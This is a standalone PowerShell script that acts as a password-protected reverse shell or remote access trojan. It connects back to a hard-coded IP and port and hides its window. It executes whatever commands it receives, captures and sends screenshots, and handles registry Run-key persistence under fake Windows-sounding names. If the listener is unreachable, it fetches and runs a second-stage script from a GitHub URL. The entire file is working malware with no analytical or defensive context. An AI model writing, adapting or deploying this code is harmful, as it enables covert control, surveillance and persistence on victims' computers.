# --- CONFIG ---
$ip   = '192.168.1.15'
$port = 4444
$pass = 'biskviti'
$user = "B15cu1t" # Safety Filter
$reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

try {
    # 1. INITIAL CONNECTION
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true

    # 2. AUTHENTICATION
    $w.WriteLine("AUTH:")
    if ($r.ReadLine() -eq $pass) {
        
        # 3. HIDE WINDOW (Only after successful login)
        try {
            $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
            $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
            $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
        } catch {}

        $w.WriteLine("--- ATOMIC ACCESS GRANTED: $env:COMPUTERNAME ---")

        # 4. MAIN COMMAND LOOP
        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $raw = $r.ReadLine(); if ($null -eq $raw) { break }
            $cmd = $raw.Trim()

            if ($cmd -eq "exit") { break }
            
            elseif ($cmd -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            }
            
            elseif ($cmd -eq "kill") {
                $w.WriteLine("[-] Starting Targeted Cleanup...")
                # Safety Loop: Only deletes if it belongs to YOU
                "WinDiag","WinUpdate","WinLog","WinService" | ForEach-Object {
                    $item = Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
                    if ($item.$_ -like "*$user*") {
                        Remove-ItemProperty -Path $reg -Name $_
                        $w.WriteLine("[+] Cleaned: $_")
                    }
                }
                $w.WriteLine("[!] All persistence removed. Terminating.")
                $c.Close(); exit
            }
            
            else {
                iex $cmd 2>&1 | Out-String | %{ $w.WriteLine($_) }
            }
        }
    } else {
        # WRONG PASSWORD = EMERGENCY WIPE
        "WinDiag","WinUpdate","WinLog","WinService" | % { Remove-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue }
        $w.WriteLine("WRONG PASSWORD. SELF-DESTRUCTING."); exit
    }
    $c.Close()
} catch {
    # RETRY LOGIC (Wait 120s if no listener)
    Start-Sleep -s 120
    $u = "https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v2.ps1"
    iex (New-Object Net.WebClient).DownloadString($u)
}
